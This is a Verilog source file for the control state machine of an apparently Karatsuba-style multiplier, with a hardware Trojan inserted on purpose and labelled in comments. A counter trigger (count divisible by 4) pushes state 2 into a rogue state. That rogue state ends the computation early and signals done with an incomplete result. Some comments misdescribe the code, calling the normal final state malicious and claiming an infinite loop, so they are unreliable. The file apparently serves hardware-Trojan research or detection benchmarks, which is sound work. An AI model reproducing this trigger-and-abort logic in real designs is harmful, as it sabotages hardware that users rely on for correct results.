module control_low_area_trojan(clk, rst, addra, addrb, mulEnd, outLoop, mulOn, karatRst, karatDone, done);

    input clk, rst, karatDone;
    output reg [1:0] addra, addrb;
    output reg mulEnd, outLoop, mulOn;
    output done;
    output reg karatRst;
    reg [8:0] count;
    reg [5:0] pstate, nstate;

    // Trojan variable
    reg trojan_active;

    always @(posedge clk)
    begin
        if (rst)
            count <= 9'd0;
        else if (pstate >= 6'd41)
            count <= count;
        else
            count <= count + 1;
    end

    always @(posedge clk)
    begin
        if (rst)
            pstate <= 6'd0;
        else
            pstate <= nstate;
    end

    // Trojan activation condition: count divisible by 4
    always @(posedge clk)
    begin
        if (rst)
            trojan_active <= 1'b0;
        else if (count % 4 == 0)
            trojan_active <= 1'b1; // Activate Trojan
        else
            trojan_active <= 1'b0;
    end

    assign done = (pstate == 6'd41 || rst == 1) ? 1 : 0;

    always @(*)
    begin
        case (pstate)
            6'd0: nstate <= 6'd1;
            6'd1:
                begin
                    if (karatDone == 1)
                        nstate <= 6'd2;
                    else
                        nstate <= 6'd1;
                end
            // Insert Trojan behavior
            6'd2:
                begin
                    if (trojan_active)
                        nstate <= 6'd42; // Move to malicious infinite loop state
                    else
                        nstate <= 6'd3;
                end
            6'd3: nstate <= 6'd4;
            6'd4: 
               begin
                   if(karatDone==1)
                       nstate<=6'd5;
                   else
                       nstate<=6'd4;
               end
            6'd5: nstate<=6'd6;
            6'd6: 
               begin
                   if(karatDone==1)
                       nstate<=6'd7;
                   else
                       nstate<=6'd6;
               end
            6'd7: nstate<=6'd8;
            6'd8: nstate<=6'd9;
            6'd9: 
               begin
                   if(karatDone==1)
                       nstate<=6'd10;
                   else
                       nstate<=6'd9;
               end
            6'd10: nstate<=6'd11;
            6'd11: 
               begin
                   if(karatDone==1)
                       nstate<=6'd12;
                   else
                       nstate<=6'd11;
               end
            6'd12: nstate<=6'd13;
            6'd13: 
                begin
                    if(karatDone==1)
                        nstate<=6'd14;
                    else
                        nstate<=6'd13;
                end
            6'd14: nstate<=6'd15;
            6'd15: nstate<=6'd16;
            6'd16: 
               begin
                    if(karatDone==1)
                        nstate<=6'd17;
                    else
                        nstate<=6'd16;
                end
            6'd17: nstate<=6'd18;
            6'd18: 
               begin
                    if(karatDone==1)
                        nstate<=6'd19;
                    else
                        nstate<=6'd18;
                end
            6'd19: nstate<=6'd20;
            6'd20: 
               begin
                    if(karatDone==1)
                        nstate<=6'd21;
                    else
                        nstate<=6'd20;
                end
            6'd21: nstate<=6'd22;
            6'd22: 
               begin
                    if(karatDone==1)
                        nstate<=6'd23;
                    else
                        nstate<=6'd22;
                end
            6'd23: nstate<=6'd24;
            6'd24: nstate<=6'd25;
            6'd25: 
               begin
                    if(karatDone==1)
                        nstate<=6'd26;
                    else
                        nstate<=6'd25;
                end
            6'd26: nstate<=6'd27;
            6'd27: 
               begin
                    if(karatDone==1)
                        nstate<=6'd28;
                    else
                        nstate<=6'd27;
                end
            6'd28: nstate<=6'd29;
            6'd29: 
               begin
                    if(karatDone==1)
                        nstate<=6'd30;
                    else
                        nstate<=6'd29;
                end
            6'd30: nstate<=6'd31;
            6'd31: nstate<=6'd32;
            6'd32: 
               begin
                    if(karatDone==1)
                        nstate<=6'd33;
                    else
                        nstate<=6'd32;
                end
            6'd33: nstate<=6'd34;
            6'd34: 
               begin
                    if(karatDone==1)
                        nstate<=6'd35;
                    else
                        nstate<=6'd34;
                end
            6'd35: nstate<=6'd36;
            6'd36: nstate<=6'd37;
            6'd37: 
               begin
                    if(karatDone==1)
                        nstate<=6'd38;
                    else
                        nstate<=6'd37;
                end
            6'd38: nstate<=6'd39;
            6'd39: nstate<=6'd40;
            6'd40: nstate<=6'd41;
            6'd41: nstate <= 6'd42; // Stuck in this state indefinitely
            default: nstate <= 6'd41;
        endcase
    end

    always @(*)
    begin
        case (pstate)
            6'd0:
            begin
                mulOn <= 1'd0;
                mulEnd <= 1'd0;
                outLoop <= 1'd0;
                addra <= 2'd0;
                addrb <= 2'd0;
                karatRst <= 1'd1;
            end
            6'd1:
            begin
                mulOn <= 1'd0;
                mulEnd <= 1'd0;
                outLoop <= 1'd0;
                addra <= 2'd0;
                addrb <= 2'd0;
                karatRst <= 1'd0;
            end
            6'd2:
            begin
                mulOn <= 1'd1;
                mulEnd <= 1'd0;
                outLoop <= 1'd0;
                addra <= 2'd0;
                addrb <= 2'd0;
                karatRst <= 1'd1;
            end
            6'd3:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; //i=0
                addra<=2'd0;
                addrb<=2'd1;
                karatRst<=1'd1;
            end
            6'd4:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd0;
                addrb<=2'd1;
                karatRst<=1'd0;
            end
            6'd5:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd1;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd6:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd1;
                addrb<=2'd0;
                karatRst<=1'd0;
            end
            6'd7:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd8:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; //i=1
                addra<=2'd0;
                addrb<=2'd2;
                karatRst<=1'd1;
            end
            6'd9:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd0;
                addrb<=2'd2;
                karatRst<=1'd0;
            end
            6'd10:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd1;
                addrb<=2'd1;
                karatRst<=1'd1;
            end
            6'd11:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd1;
                addrb<=2'd1;
                karatRst<=1'd0;
            end
            6'd12:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd2;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd13:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd2;
                addrb<=2'd0;
                karatRst<=1'd0;
            end
            6'd14:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd15:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; //i=2
                addra<=2'd0;
                addrb<=2'd3;
                karatRst<=1'd1;
            end
            6'd16:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd0;
                addrb<=2'd3;
                karatRst<=1'd0;
            end
            6'd17:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd1;
                addrb<=2'd2;
                karatRst<=1'd1;
            end
            6'd18:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd1;
                addrb<=2'd2;
                karatRst<=1'd0;
            end
            6'd19:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd2;
                addrb<=2'd1;
                karatRst<=1'd1;
            end
            6'd20:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd2;
                addrb<=2'd1;
                karatRst<=1'd0;
            end
            6'd21:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd3;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd22:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd3;
                addrb<=2'd0;
                karatRst<=1'd0;
            end
            6'd23:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd24:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; // i=3 
                addra<=2'd1;
                addrb<=2'd3;
                karatRst<=1'd1;
            end
            6'd25:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd1;
                addrb<=2'd3;
                karatRst<=1'd0;
            end
            6'd26:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd2;
                addrb<=2'd2;
                karatRst<=1'd1;
            end
            6'd27:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd2;
                addrb<=2'd2;
                karatRst<=1'd0;
            end
            6'd28:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd3;
                addrb<=2'd1;
                karatRst<=1'd1;
            end
            6'd29:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd3;
                addrb<=2'd1;
                karatRst<=1'd0;
            end
            6'd30:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd31:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; //i=4
                addra<=2'd2;
                addrb<=2'd3;
                karatRst<=1'd1;
            end
            6'd32:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd2;
                addrb<=2'd3;
                karatRst<=1'd0;
            end
            6'd33:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd3;
                addrb<=2'd2;
                karatRst<=1'd1;
            end
            6'd34:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd3;
                addrb<=2'd2;
                karatRst<=1'd0;
            end
            6'd35:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd36:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; //i=5
                addra<=2'd3;
                addrb<=2'd3;
                karatRst<=1'd1;
            end
            6'd37:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd0;
                addra<=2'd3;
                addrb<=2'd3;
                karatRst<=1'd0;
            end
            6'd38:
            begin
                mulOn<=1'd1;
                mulEnd<=1'd0;
                outLoop<=1'd0; 
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd39:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd0;
                outLoop<=1'd1; //i=6
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            6'd40:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd1;
                outLoop<=1'd0; 
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end
            // Malicious state for infinite loop
            6'd41:
            begin
                mulOn<=1'd0;
                mulEnd<=1'd1;
                outLoop<=1'd0; 
                addra<=2'd0;
                addrb<=2'd0;
                karatRst<=1'd1;
            end

            default:
            begin
                mulOn <= 1'd0;
                mulEnd <= 1'd0;
                outLoop <= 1'd0;
                addra <= 2'd0;
                addrb <= 2'd0;
                karatRst <= 1'd1;
            end
        endcase
    end

endmodule